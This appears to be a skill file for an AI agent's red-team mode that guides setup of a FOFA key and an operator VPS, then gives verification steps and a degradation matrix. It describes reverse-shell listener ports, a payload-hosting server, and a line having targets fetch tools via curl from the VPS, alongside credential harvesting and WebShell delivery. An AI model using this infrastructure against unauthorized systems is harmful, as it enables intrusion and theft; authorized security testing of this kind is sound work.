---
name: redteam-setup
description: "Initial setup guide: assists operator with configuring FOFA_KEY and VPS credentials, verifies connectivity, and outlines graceful degradation options"
whenToUse: "When the operator initializes red team mode for the first time, when redteam_preflight indicates onboarding.incomplete or broken skills, or when the operator requests environment or tool setup"
role: plan
enabled: true
---

# Initial Setup Guide (Environment Configuration)

**Trigger Conditions** (Execute this skill immediately if any condition is met):
- `redteam_preflight` returns `onboarding.complete = false`.
- `redteam_preflight` reports `broken` skills caused by missing environment variables or placeholder VPS hosts.
- Operator launches red team mode for the first time or requests configuration assistance.

**Core Principle**: **Request all prerequisites in a single comprehensive interaction**. Avoid piecemeal back-and-forth prompts.

## 1. Confirm Toolkit Availability (npm Distributions Exclude Binaries by Default)

Standard npm distributions of `dsh-redteam-mode` **do not bundle automated binary installers or the 9 exploitation/tunneling skills**
(tunneling, credentials, WebShells, reverse shells, lateral movement, unauthorized access exploits). Reason: npm automated package review flags packages that download security/penetration binaries during install hooks.

- **If** `$DSH_HOME/redteam/setup.sh` exists (downloaded via toolkit archive or non-npm install) -> follow Sections 1 and 2 below.
- **If missing** (`redteam_preflight` returns `onboarding.setup_script.exists = false`) -> direct the operator to download `dsh-redteam-mode-<version>-toolkit.tar.gz` from GitHub Releases, extract it, and **execute the setup script directly**, then proceed to Section 3 for `FOFA_KEY` and VPS configuration.
- **No toolkit fallback**: The 14 built-in reconnaissance and vulnerability scanning skills (`fofa-recon`, `active-scan`, `nuclei-scan`, `web-fingerprint`, `dir-bruteforce`, etc.) operate without binary toolkits, enabling asset discovery and vulnerability validation without on-host exploitation.

> **Operational Boundary**: This extension **never automatically downloads or executes penetration testing binaries on the operator's behalf**. Required tools and their download locations are documented for operator execution.

## 2. Operator Prerequisites (Comprehensive Checklist)

| Prerequisite | Rationale | Destination | Impact if Missing |
| --- | --- | --- | --- |
| **FOFA_KEY** | Asset mapping (`fofa-recon`) sweeps the target's external internet perimeter. Without it, discovery relies on certificate transparency and subfinder, **missing unindexed or unlinked external assets** | Environment variable `FOFA_KEY` or `$DSH_HOME/.env` | Reconnaissance degrades; incomplete asset discovery limits subsequent phases |
| **VPS Credentials** (`user@ip` + SSH key) | Reverse shells require a **publicly reachable, operator-controlled host** for callbacks, payload delivery, and pivot tunneling | `REDTEAM_VPS_HOST` (`user@host`) / `REDTEAM_VPS_KEY` (SSH private key path, default `$DSH_HOME/redteam/toolkit/vps/id_rsa`) | Inability to catch reverse shells, host payloads, or pivot into internal subnets |
| (Optional) Secondary mapping keys | Quake, Hunter, and ZoomEye surface complementary asset data | Environment variables, as needed | Reduced cross-validation coverage |
| (Optional) Package installations | System utilities (`nmap`, `hydra`, `hashcat`) | Operator runs `sudo apt install ...` | Dependent skills operate in degraded modes |

**Communication Protocol**: Present requirements clearly and await operator response. Do not quietly default to degraded reconnaissance unless the operator explicitly directs execution under current constraints.

**Security Discipline**: Operator API keys and private keys **must never be committed to git repositories, pasted into markdown reports, or exposed in the `tool` parameter of `redteam_chain_add`**.
Store them securely in `$DSH_HOME/.env` (enforcing `chmod 600`).

### FOFA_KEY Acquisition Guide
1. Log in to <https://fofa.info> -> Profile Menu -> **Personal Center -> API Key**.
2. Standard account rate limits: 10,000 queries/month, 1 request per second concurrency (scripts enforce 1 req/sec rate limiting; exceeding this triggers error 45012).
3. Test key validity via CLI: `curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` — returns `"error":false` on success.

### VPS Host Setup Guide
- A **publicly reachable** Linux VPS (1 CPU, 1GB RAM minimum) with cloud firewall ingress open for: `22` (SSH), `9000-9999` (reverse shell listener pool), and `9100` (payload HTTP hosting).
- Provision the SSH private key at `$DSH_HOME/redteam/toolkit/vps/id_rsa` with strict permissions: `chmod 600`.
- Verify connectivity: `ssh -i <key_path> <user>@<ip> 'echo ok'`.
- **Payload Service**: Host a local payload folder on the VPS: `python3 -m http.server 9100` inside a persistent `tmux` session, enabling targets to download tools via `curl http://<ip>:9100/fscan`.

## 3. Post-Configuration Verification (Mandatory)

Empirically verify all configured services:

```bash
# 1) Verify FOFA key
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) Verify VPS SSH reachability
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'

# 3) Review registered skills
#    Execute redteam_preflight to confirm available skills
```

## 4. Finalizing Setup State

Once verified, record the completion timestamp:

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

Re-execute `redteam_preflight` to confirm: `onboarding.complete = true` and `broken` skills are cleared or accepted under degraded operation.
Present a concise readiness status to the operator detailing: available capabilities, missing components, and operational impact.

**Note**: Modifying `$DSH_HOME/.env` requires restarting the dsh service to reload environment variables into the active process.

## 5. Graceful Degradation Matrix (When Prerequisites Are Withheld)

| Missing Prerequisite | Degradation Strategy | Documented Operational Limitations |
| --- | --- | --- |
| FOFA_KEY | Rely on crt.sh certificate logs, `passive-recon`, `recon-pipeline` (subfinder/ksubdomain/dnsx), and public search engines | **Asset coverage will be incomplete**; unindexed perimeter nodes will be missed; potential score ceiling is reduced |
| VPS Infrastructure | Limit engagement to non-landing attack primitives (credential harvesting, web application access, data extraction, WebShell delivery) | **Cannot capture reverse shells or pivot into internal subnets**; `boundary`, `internal`, and `central-system` scores cannot be attained |
| System Utilities (nuclei, etc.) | Fallback to standalone binaries in toolkit (httpx, subfinder remain functional) | Vulnerability detection coverage significantly impaired; N-day auditing is restricted |
| Complete Prerequisite Absence | Execute passive reconnaissance and high-level asset inventory only | Clearly notify the operator that operations are restricted to passive reconnaissance |

**All operational constraints must be documented in engagement reports** to contextualize findings.
